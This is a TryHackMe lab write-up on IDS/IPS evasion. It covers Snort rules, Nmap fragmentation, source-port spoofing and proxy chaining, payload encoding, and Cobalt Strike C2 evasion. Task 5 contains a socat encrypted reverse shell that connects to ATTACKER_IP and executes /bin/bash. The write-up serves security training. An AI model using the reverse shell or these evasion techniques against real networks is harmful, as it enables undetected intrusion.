# THM-Writeup-Network-Security
Network security - IDS/IPS evasion techniques using Snort, Nmap, Ncat, Socat, and Cobalt Strike.

By Ramyar Daneshgar 

## Task 1: Introduction to IDS and IPS
An Intrusion Detection System (IDS) passively monitors network traffic for signs of compromise, misconfiguration, or abuse. It performs deep packet inspection or pattern matching to alert on known threats or anomalies. However, IDS lacks enforcement capabilities—it cannot interrupt traffic on its own.

An Intrusion Prevention System (IPS) operates inline and actively blocks or mitigates malicious traffic in real time. To deploy Snort as an IPS, it must be placed inline between interfaces, bridging traffic and enforcing drop or reject actions based on rule sets. Snort's power lies in its flexible deployment as both an IDS (monitor mode) and an IPS (inline mode).

Two primary architectures exist:
- **HIDS (Host-Based IDS)**: Deployed directly on endpoints. It monitors internal system calls, processes, and file integrity.
- **NIDS (Network-Based IDS)**: Monitors network traffic by connecting to SPAN or TAP ports, ideally placed at choke points to observe traffic between critical segments.

## Task 2: IDS Engine Types
Detection engines within IDS fall into two categories:

- **Signature-Based Detection**: Relies on predefined rules or known attack patterns. It is efficient and accurate against known threats but blind to novel or obfuscated payloads.

  Example: Antivirus detection of malware via hash or byte sequence.

- **Anomaly-Based Detection**: Builds behavioral models from legitimate traffic. Any deviation from the baseline may raise an alert. This model can catch zero-day attacks but is prone to false positives if the baseline isn't well-tuned.

  Example: An IDS might learn that a DNS server never initiates outbound TCP connections, so if it suddenly does, that triggers an anomaly alert.

Balancing these approaches in hybrid detection engines (as seen in modern NIDS) helps improve coverage and reduce false alerts.

## Task 3: IDS/IPS Rule Triggering
I explored how Snort rules are structured:

```
action protocol src_ip src_port -> dst_ip dst_port (options)
```

Options define the pattern to match (e.g., content, length, flags) and metadata (e.g., msg, sid, rev).

Example:
```
drop icmp any any -> any any (msg:"ICMP Ping Scan"; dsize:0; sid:1000020; rev:1;)
```

This rule drops ICMP echo requests with no payload—indicative of scanning behavior.

Snort logs reveal triggering rules and packet metadata:
- Source and destination IP/port
- TCP flags
- Timestamps and TTL

I correlated logs to identify attacker behavior. For example, a scan was sourced from `10.14.17.226` targeting `10.10.112.168`. Signature evasion requires just minor payload changes to break simple pattern matching. This highlights the fragility of static signatures.

## Task 4: Evasion via Protocol Manipulation
Attackers manipulate transport protocols to evade detection. I experimented with:

1. **Protocol Switching**: Using UDP instead of TCP, or HTTP instead of DNS to bypass restrictive filtering.
2. **Source Port Spoofing**:
   - `nmap -sS -Pn -g 80 -F TARGET` simulates HTTP traffic by setting source port 80.
   - `ncat -ulvnp 53` listens on a UDP port associated with DNS to appear legitimate.
3. **Packet Fragmentation**:
   - `nmap -f` sends 8-byte fragmented packets.
   - `nmap --mtu 16` sets MTU size to 16 bytes to break payload across multiple packets.

If the IDS doesn’t reassemble fragmented packets, the malicious payload goes undetected.

## Task 5: Evasion via Payload Manipulation
Manipulating content inside packets avoids signature detection without changing attack intent. Techniques include:

- **Base64 Encoding**: Easily decodable but avoids raw byte string matching.
- **URL Encoding**: Obfuscates special characters (e.g., `%2F` for `/`).
- **Unicode Escaping**: Converts each character into escape sequences (`\u006e\u0063` for "nc").
- **Encrypted Shells**:
   1. Generate SSL cert with `openssl req`
   2. Merge key+cert into `.pem`
   3. Use `socat` to set up encrypted listener and client

Example:
```
socat -d -d OPENSSL-LISTEN:4443,cert=key.pem,verify=0,fork STDOUT
socat OPENSSL:ATTACKER_IP:4443,verify=0 EXEC:/bin/bash
```

Encryption ensures IDS cannot see command strings like `cat /etc/passwd`, even with packet capture.

## Task 6: Evasion via Route Manipulation
By manipulating routing, attackers can obscure the origin or path of traffic:

- **Loose Source Routing**:
  - `nmap --ip-options "L 10.0.0.1 10.0.0.2" TARGET`
  - Packets traverse predefined hops, useful if firewalls or IDS are positioned asymmetrically.

- **Proxy Chaining**:
  - `nmap -sS --proxies http://proxy1:8080,socks4://proxy2:1080 TARGET`
  - Layers obfuscation using chained HTTP and SOCKS proxies

This approach helps in simulating traffic from trusted sources or outside monitoring zones.

## Task 7: Evasion via Tactical DoS
Instead of targeting hosts or services, attackers may target the IDS/IPS system itself:

- **Resource Exhaustion**: Flood the network with high volumes of benign traffic to consume CPU/memory.
- **Log Saturation**: Generate numerous false positives to overload storage or distract analysts.
- **Alert Fatigue**: Create consistent low-risk alerts to reduce attention to actual attacks.

This threat emphasizes the need for triage automation and alert prioritization in SOC environments.

## Task 8: C2 and IDS/IPS Evasion
Command and Control (C2) evasion techniques from frameworks like **Cobalt Strike** include:

- **User-Agent Spoofing**: Mimic browsers or legit apps to avoid signature rules.
- **Sleep and Jitter**: Randomize beacon intervals to evade behavioral thresholds.
- **DNS Beaconing**: Encode data in subdomains to exfiltrate via DNS queries.
- **Custom Certificates**: Avoid default C2 tool cert fingerprints that are easily blacklisted.

A well-configured malleable C2 profile can remain undetected for prolonged periods in production networks.

## Task 9: Next-Gen Security
Next-Generation Network IPS (NGNIPS) offers:

- **Deep Packet Inspection (DPI)**: Beyond layer 4, inspecting payloads and application signatures.
- **Context Awareness**: Correlate traffic with device, user, or location data.
- **Content Classification**: Detect file types, malware payloads, and document transfers.
- **Threat Intelligence Feeds**: Continuously update rule sets with latest IOCs.
- **Scalable Architecture**: Handle modern bandwidth and east-west traffic.

Many NGIPS features are now merged into **Next-Gen Firewalls (NGFW)**.

# Lessons Learned:
1. Signature-based IDS is only as strong as its rule set and update frequency.
2. Minor obfuscation (encoding, fragmentation) is enough to bypass weak rules.
3. Encryption negates payload inspection unless decrypted inline.
4. Strategic evasion includes traffic shaping, proxy hopping, and user-agent spoofing.
5. IDS is vulnerable to fatigue and resource denial if not tuned.
6. Next-gen solutions must be coupled with behavior analysis and context to maintain relevance.
7. Adversaries target controls—not just systems—requiring red-team-informed blue team defenses.


